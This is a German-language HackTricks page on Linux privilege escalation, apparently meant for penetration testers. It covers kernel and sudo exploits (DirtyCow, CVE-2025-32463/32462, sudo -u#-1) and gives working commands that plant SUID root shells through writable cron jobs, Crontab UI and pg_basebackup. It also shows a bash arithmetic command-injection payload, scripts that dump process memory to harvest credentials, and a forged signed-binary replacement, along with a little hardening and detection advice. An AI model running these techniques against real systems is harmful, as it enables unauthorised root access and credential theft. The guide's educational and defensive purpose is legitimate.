# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Beginnen wir damit, etwas Wissen über das laufende OS zu gewinnen
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn du **Schreibrechte für einen beliebigen Ordner innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige Libraries oder Binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinfo

Interessante Informationen, Passwörter oder API-Keys in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, der zur Rechteausweitung verwendet werden kann
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

To extract all the vulnerable kernel versions from that web you can do:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (auf dem Opfer ausführen, prüft exploits nur für kernel 2.x)

Suche die kernel version immer **in Google**, vielleicht ist deine kernel version in einem kernel exploit erwähnt und dann kannst du sicher sein, dass dieser exploit gültig ist.

Weitere kernel exploitation-Techniken:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den verwundbaren sudo-Versionen, die erscheinen in:
```bash
searchsploit sudo
```
Du kannst prüfen, ob die sudo-Version verwundbar ist, indem du dieses grep verwendest.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben nicht privilegierten lokalen Benutzern, ihre Rechte über die sudo-Option `--chroot` zu root zu eskalieren, wenn die Datei `/etc/nsswitch.conf` aus einem von einem Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Bevor du den Exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und dass sie das `chroot`-Feature unterstützt.

Für weitere Informationen siehe den ursprünglichen [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo vor 1.9.17p1 (gemeldeter betroffener Bereich: **1.8.8–1.9.17**) kann host-basierte sudoers-Regeln unter Verwendung des **vom Benutzer angegebenen Hostnamens** aus `sudo -h <host>` statt des **echten Hostnamens** auswerten. Wenn sudoers auf einem anderen Host weitreichendere Rechte gewährt, kannst du diesen Host lokal **spoofen**.

Anforderungen:
- Verwundbare sudo-Version
- Host-spezifische sudoers-Regeln (Host ist weder der aktuelle Hostname noch `ALL`)

Beispiel für ein sudoers-Muster:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit durch Spoofing des erlaubten Hosts:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Wenn die Auflösung des gefälschten Namens blockiert, füge ihn zu `/etc/hosts` hinzu oder verwende einen Hostnamen, der bereits in Logs/Configs auftaucht, um DNS-Lookups zu vermeiden.

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-Signaturverifikation fehlgeschlagen

Sieh dir **smasher2 box of HTB** für ein **Beispiel** an, wie diese Verwundbarkeit ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemaufzählung
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Verteidigungen enumerieren

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Wenn du dich in einem Container befindest, beginne mit dem folgenden Container-Security-Abschnitt und wechsle dann zu den runtime-spezifischen Abuse-Seiten:


{{#ref}}
container-security/
{{#endref}}

## Drives

Prüfe **was gemountet und unmounted** ist, wo und warum. Wenn etwas unmounted ist, kannst du versuchen, es zu mounten und nach privaten Informationen zu suchen
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Auch prüfen, ob **ein Compiler installiert ist**. Das ist nützlich, wenn du einen Kernel-Exploit verwenden musst, da es empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Überprüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um Rechte zu eskalieren…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um auf der Maschine installierte veraltete und verwundbare Software zu prüfen.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen werden, die größtenteils unbrauchbar sind. Daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine installierte Softwareversion anfällig für bekannte exploits ist_

## Prozesse

Wirf einen Blick darauf, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er sollte** (vielleicht wird ein tomcat als root ausgeführt?)
```bash
ps aux
ps -ef
top -n 1
```
Immer nach möglichen laufenden [**electron/cef/chromium debuggers**](electron-cef-chromium-debugger-abuse.md) suchen, die du ausnutzen könntest, um Privilegien zu eskalieren. **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Kommandozeile des Prozesses prüft.\
Prüfe außerdem **deine Privilegien über die Prozess-Binaries**, vielleicht kannst du jemand anderen überschreiben.

### Parent-Child-Chains zwischen verschiedenen Benutzern

Ein Child-Prozess, der unter einem **anderen Benutzer** als sein Parent läuft, ist nicht automatisch bösartig, aber er ist ein nützliches **Triage-Signal**. Einige Übergänge sind zu erwarten (`root` startet einen Service-User, Login-Manager erstellen Session-Prozesse), aber ungewöhnliche Chains können Wrapper, Debug-Hilfen, Persistence oder schwache Trust-Boundaries der Laufzeit offenlegen.

Kurzer Überblick:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Wenn du eine überraschende Kette findest, prüfe die Parent-Command-Line und alle Dateien, die ihr Verhalten beeinflussen (`config`, `EnvironmentFile`, Helper-Skripte, Arbeitsverzeichnis, schreibbare Argumente). In mehreren realen privesc-Pfaden war das Child selbst nicht schreibbar, aber die **vom Parent kontrollierte Konfiguration** oder die Helper-Kette schon.

### Gelöschte Executables und deleted-open files

Runtime-Artefakte sind oft auch **nach dem Löschen** noch zugänglich. Das ist sowohl für privilege escalation als auch für das Wiederherstellen von Beweisen nützlich, wenn ein Prozess bereits sensible Dateien offen hat.

Prüfe auf gelöschte Executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Wenn `/proc/<PID>/exe` auf `(deleted)` zeigt, läuft der Prozess noch mit dem alten Binär-Image aus dem Speicher. Das ist ein starkes Signal für eine Untersuchung, weil:

- das entfernte Executable möglicherweise interessante Strings oder Credentials enthält
- der laufende Prozess möglicherweise noch nützliche File Descriptors offenlegt
- ein gelöschtes privilegiertes Binary auf kürzliche Manipulation oder einen versuchten Cleanup hinweisen kann

Gelöschte, geöffnete Dateien global erfassen:
```bash
lsof +L1
```
Wenn du einen interessanten Descriptor findest, stelle ihn direkt wieder her:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Das ist besonders wertvoll, wenn ein Prozess noch eine gelöschte secret, script, database export oder flag file geöffnet hat.

### Process monitoring

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn eine Reihe von Anforderungen erfüllt ist.

### Process memory

Einige Dienste auf einem Server speichern **credentials im Klartext im Speicher**.\
Normalerweise brauchst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören, daher ist das meist nützlicher, wenn du bereits root bist und nach weiteren credentials suchen willst.\
Denke jedoch daran, dass du **als regulärer Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du keine anderen Prozesse dumpen kannst, die zu deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie dieselbe uid haben. Das ist die klassische Art, wie ptracing funktioniert hat.
> - **kernel.yama.ptrace_scope = 1**: Nur ein Elternprozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE capability erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Reboot nötig, um ptracing wieder zu aktivieren.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Dienstes (zum Beispiel) hast, könntest du den Heap auslesen und darin nach seinen credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps**, wie Speicher innerhalb des **virtuellen Adressraums** dieses Prozesses abgebildet ist; außerdem werden die **Berechtigungen jeder abgebildeten Region** angezeigt. Die **mem**-Pseudodatei **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherregionen lesbar** sind und ihre Offsets. Wir verwenden diese Information, um **in die mem-Datei zu springen und alle lesbaren Regionen in eine Datei zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Linux-Neuinterpretation des klassischen ProcDump-Tools aus der Sysinternals-Suite von Tools für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Um den Speicher eines Prozesses zu dumpen, kannst du verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst die Root-Anforderungen manuell entfernen und den Prozess dumpen, der dir gehört
- Script A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Credentials from Process Memory

#### Manual example

Wenn du feststellst, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Wege zu finden, den Speicher eines Prozesses zu dumpen) und im Speicher nach Credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Zugangsdaten aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es erfordert Root-Rechte, um ordnungsgemäß zu funktionieren.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Wenn ein webbasiertes „Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem per SSH Local Port Forwarding erreichen und einen privilegierten Job erstellen, um die Rechte zu erhöhen.

Typische Kette
- Loopback-only-Port entdecken (z. B. 127.0.0.1:8000) und Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Anmeldedaten in betrieblichen Artefakten finden:
- Backups/Skripte mit `zip -P <password>`
- systemd unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen High-Priv-Job und führe ihn sofort aus (dropt SUID-Shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwende es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Crontab UI nicht als root ausführen; mit einem dedizierten Benutzer und minimalen Berechtigungen einschränken
- An localhost binden und zusätzlich den Zugriff per Firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Keine Secrets in Unit-Dateien einbetten; Secret-Stores oder eine root-only EnvironmentFile verwenden
- Audit/Logging für On-Demand-Jobausführungen aktivieren



Prüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du einen Vorteil aus einem Skript ziehen, das von root ausgeführt wird (Wildcard-Schwachstelle? kannst du Dateien ändern, die root verwendet? Symlinks verwenden? spezifische Dateien in dem Verzeichnis erstellen, das root nutzt?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Wenn `run-parts` verwendet wird, prüfen Sie, welche Namen tatsächlich ausgeführt werden:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Dies vermeidet False Positives. Ein beschreibbares periodisches Verzeichnis ist nur nützlich, wenn dein Payload-Dateiname den lokalen `run-parts`-Regeln entspricht.

### Cron path

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der User "user" Schreibrechte auf /home/user hat_)

Wenn in diesem crontab der root-User versucht, einen Befehl oder ein Skript auszuführen, ohne den path zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Skript mit einem Wildcard (Wildcard Injection)

Wenn ein Skript von root ausgeführt wird und in einem Befehl ein “**\***” enthält, kannst du das ausnutzen, um unerwartete Dinge zu tun (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn dem Wildcard ein Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist er nicht verwundbar (auch** _**./\***_ **ist es nicht).**

Lies die folgende Seite für weitere Wildcard-Exploitation-Tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt Parameter Expansion und Command Substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und sie in einen arithmetischen Kontext einspeist, kann ein Angreifer eine Command Substitution $(...) injizieren, die beim Ausführen von cron als root ausgeführt wird.

- Warum es funktioniert: In Bash laufen die Expansionen in dieser Reihenfolge ab: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird daher zuerst ersetzt (wobei der Befehl ausgeführt wird), und danach wird die verbleibende Zahl `0` für die Arithmetik verwendet, sodass das Skript ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Beispiel: ein Log parsen und ein Count-Feld "summieren", das aus dem Log kommt
while IFS=',' read -r ts user count rest; do
# count ist nicht vertrauenswürdig, wenn das Log vom Angreifer kontrolliert wird
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass vom Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das numerisch aussehende Feld eine Command Substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite es um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du ein cron script **ändern kannst**, das von root ausgeführt wird, kannst du sehr leicht eine Shell bekommen:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte Skript ein **Verzeichnis verwendet, auf das du vollen Zugriff hast**, kann es nützlich sein, diesen Ordner zu löschen und **einen Symlink-Ordner zu einem anderen** zu erstellen, der ein von dir kontrolliertes Skript bereitstellt
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-Validierung und sichereres Datei-Handling

Beim Prüfen privilegierter Skripte/Binaries, die Dateien über einen Pfad lesen oder schreiben, verifiziere, wie Links behandelt werden:

- `stat()` folgt einem Symlink und gibt Metadaten des Ziels zurück.
- `lstat()` gibt Metadaten des Links selbst zurück.
- `readlink -f` und `namei -l` helfen dabei, das endgültige Ziel aufzulösen und die Berechtigungen jeder Pfadkomponente anzuzeigen.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Für Defender/Entwickler sind sicherere Muster gegen Symlink-Tricks:

- `O_EXCL` mit `O_CREAT`: abbrechen, wenn der Pfad bereits existiert (blockiert vom Angreifer vorab angelegte Links/Dateien).
- `openat()`: relativ zu einem vertrauenswürdigen Verzeichnis-File-Descriptor arbeiten.
- `mkstemp()`: temporäre Dateien atomar mit sicheren Berechtigungen erstellen.

### Custom-signed cron binaries mit schreibbaren Payloads
Blue Teams „signen“ cron-gesteuerte Binaries manchmal, indem sie einen eigenen ELF-Abschnitt ausgeben und vor dem Ausführen als root nach einem Vendor-String suchen. Wenn dieses Binary gruppenschreibbar ist (z. B. `/opt/AV/periodic-checks/monitor` mit `root:devs 770`) und du das Signing-Material leakst, kannst du den Abschnitt fälschen und den cron-Task übernehmen:

1. Verwende `pspy`, um den Verifikations-Flow mitzuschneiden. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, danach `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` und anschließend wurde die Datei ausgeführt.
2. Erzeuge das erwartete Zertifikat mit dem geleakten Key/Config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. ein SUID-bash droppen, deinen SSH-Key hinzufügen) und bette das Zertifikat in `.text_sig` ein, damit der grep durchläuft:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und behalte die Execute-Bits bei:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Run; sobald die naive Signaturprüfung erfolgreich ist, läuft dein Payload als root.

### Häufige cron-Jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel kannst du, um **alle 0.1s für 1 Minute zu überwachen**, **nach den am wenigsten ausgeführten Commands zu sortieren** und die Commands zu löschen, die am häufigsten ausgeführt wurden, Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden gestarteten Prozess auf).

### Root-Backups, die von Angreifern gesetzte Mode-Bits beibehalten (pg_basebackup)

Wenn ein root-gehöriger cron `pg_basebackup` (oder irgendeine rekursive Kopie) gegen ein Datenbankverzeichnis ausführt, in das du schreiben kannst, kannst du ein **SUID/SGID-Binary** platzieren, das als **root:root** mit denselben Mode-Bits in das Backup-Output erneut kopiert wird.

Typischer Discovery-Flow (als niedriger privilegierter DB-User):
- Verwende `pspy`, um einen root-cron zu erkennen, der etwas wie `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` jede Minute aufruft.
- Bestätige, dass der Quell-Cluster (z. B. `/var/lib/postgresql/14/main`) für dich schreibbar ist und das Ziel (`/opt/backups/current`) nach dem Job root-gehört.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dies funktioniert, weil `pg_basebackup` beim Kopieren des Clusters die Datei-Mode-Bits beibehält; wenn es von root aufgerufen wird, übernehmen die Zieldateien **root ownership + vom Angreifer gewählte SUID/SGID**. Jede ähnliche privilegierte Backup-/Copy-Routine, die Berechtigungen beibehält und in ein ausführbares Verzeichnis schreibt, ist verwundbar.

### Invisible cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **nach einem Kommentar ein carriage return einfügt** (ohne newline character), und der cron job funktioniert. Beispiel (beachte das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Um diese Art von stealth entry zu erkennen, überprüfe cron files mit tools, die control characters sichtbar machen:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Schreibbare _.service_-Dateien

Prüfe, ob du eine `.service`-Datei schreiben kannst. Wenn ja, **könntest du sie so ändern**, dass sie **deine Backdoor ausführt, wenn** der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gebootet wird).\
Zum Beispiel kannst du deine Backdoor direkt in der `.service`-Datei mit **`ExecStart=/tmp/script.sh`** erstellen

### Schreibbare Service-Binaries

Beachte, dass du, wenn du **Schreibrechte über Binaries hast, die von Services ausgeführt werden**, diese durch Backdoors ersetzen kannst, sodass beim erneuten Ausführen der Services die Backdoors ausgeführt werden.

### systemd PATH - Relative Paths

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl sehen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, kannst du möglicherweise deine **privileges escalieren**. Du musst nach **relative paths being used on service configurations**-Dateien suchen wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstellen Sie ein **executable** mit demselben Namen wie der relative Pfad des Binaries innerhalb des systemd-PATH-Ordners, in den Sie schreiben können, und wenn der Service aufgefordert wird, die verwundbare Aktion auszuführen (**Start**, **Stop**, **Reload**), wird Ihr **backdoor** ausgeführt (unprivilegierte Benutzer können Dienste normalerweise nicht starten/stoppen, aber prüfen Sie, ob Sie `sudo -l` verwenden können).

**Erfahren Sie mehr über services mit `man systemd.service`.**

